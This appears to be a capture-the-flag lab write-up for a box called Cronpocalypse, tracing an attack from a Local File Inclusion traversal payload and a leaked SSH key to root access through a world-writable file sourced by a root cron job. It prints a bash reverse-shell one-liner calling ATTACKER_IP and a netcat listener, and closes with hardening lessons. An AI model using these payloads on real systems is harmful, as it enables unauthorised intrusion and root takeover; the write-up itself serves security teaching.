This writeup covers the complete attack chain for Cronpocalypse – from a Local File Inclusion vulnerability to root privilege escalation via a misconfigured cron job.

🔍 Reconnaissance

nmap -sC -sV 10.10.10.10

Open ports: 80 (Python web app / Werkzeug) and 22 (OpenSSH).

🌐 LFI Discovery

The "Features" page had a page parameter vulnerable to Local File Inclusion:

http://10.10.10.10/features?page=../../../../etc/passwd

This returned system files, and further enumeration revealed an SSH private key for a low-privileged user.

🔑 SSH Access & First Flag

chmod 600 id_rsa
ssh user@10.10.10.10 -i id_rsa

First flag was found in the user's home directory (content omitted per writeup guidelines).

⏱️ Privilege Escalation – Cron Job Abuse

System inspection showed a cron job running every minute as root:

cat /etc/crontab
* * * * * root /usr/local/bin/backup.sh

The script /usr/local/bin/backup.sh sourced /tmp/config.sh, which was world‑writable. This misconfiguration allowed any user to modify the script executed by root.

💣 Exploitation

A reverse shell payload was appended to /tmp/config.sh:

echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /tmp/config.sh

Netcat listener on attacker machine:

nc -lvnp 4444

Within one minute, the cron job executed the script as root, returning a root reverse shell. The final flag was retrieved from /root/root.txt.

🧠 Key Takeaways:
• Always validate user input – LFI can lead to full compromise.
• Never store credentials or private keys in web‑accessible locations.
• Root cron jobs must never execute writable scripts from world‑writable directories.
• Regular system auditing prevents privilege escalation.

🛠️ Tools Used

  • Nmap
  • Burp Suite / Browser DevTools
  • SSH
  • Netcat
  • Linux command line (crontab, echo, cat, chmod)

This lab demonstrates a realistic attack chain – from web LFI to root cron abuse – highlighting the importance of secure coding and system hardening.
